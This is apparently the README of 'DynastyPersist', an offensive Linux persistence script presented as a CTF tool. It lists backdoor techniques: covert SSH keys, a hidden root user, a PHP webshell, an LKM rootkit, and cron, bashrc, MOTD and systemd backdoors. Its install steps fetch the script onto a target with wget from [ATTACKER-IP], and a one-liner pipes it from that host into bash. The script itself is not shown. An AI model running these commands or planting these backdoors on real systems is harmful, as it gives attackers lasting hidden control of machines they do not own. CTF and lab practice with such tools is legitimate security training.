
<h1 align="center">DynastyPersist</h1>


* A CTF Tool for Linux persistence (KOTH, Battlegrounds)

* A powerful and versatile Linux persistence script designed for various security assessment and testing scenarios. This script provides a collection of features that demonstrate different methods of achieving persistence on a Linux system.

![GitHub](https://img.shields.io/github/license/trevohack/DynastyPersist)
![GitHub stars](https://img.shields.io/github/stars/trevohack/DynastyPersist)

## Features

1. **SSH Key Generation:** Automatically generates SSH keys for covert access.

2. **Cronjob Persistence:** Sets up cronjobs for scheduled persistence.

3. **Custom User with Root:** Creates a custom user with root privileges.

4. **RCE Persistence:** Achieves persistence through remote code execution (php webshell).

5. **LKM/Rootkit:** Demonstrates Linux Kernel Module (LKM) based rootkit persistence.

6. **Bashrc Persistence:** Modifies user-specific shell initialization files for persistence.

7. **Systemd Service for Root:** Sets up a systemd service for achieving root persistence.

8. **LD_PRELOAD Privilege Escalation Config:** Configures LD_PRELOAD for privilege escalation.

9. **Backdooring Message of the Day / Header:** Backdoors system message display for covert access.

10. **Modify an Existing Systemd Service:** Manipulates an existing systemd service for persistence.


## Installation

1. Clone this repository to your local machine:

```bash
$ git clone https://github.com/Trevohack/DynastyPersist.git

$ python3 -m http.server 8080 
root@tyler.thm # cd /opt && wget -c [ATTACKER-IP]:8080/DynastyPersist && cd DynastyPersist && chmod +x dynasty.sh && ./dynasty.sh
``` 

2. One linear
   
```bash
curl -sSL [ATTACKER-IP]8080/DynastyPersist/dynasty.sh | bash
``` 

## Support

For support, email spaceshuttle.io.all@gmail.com or join our Discord server. 

* Discord: `https://discord.gg/WYzu65Hp`

Thank You! 

![icons8-linux](https://github.com/Trevohack/DynastyPersist/assets/136177431/61035f94-039b-4ed9-b463-36a78aa69ab0)
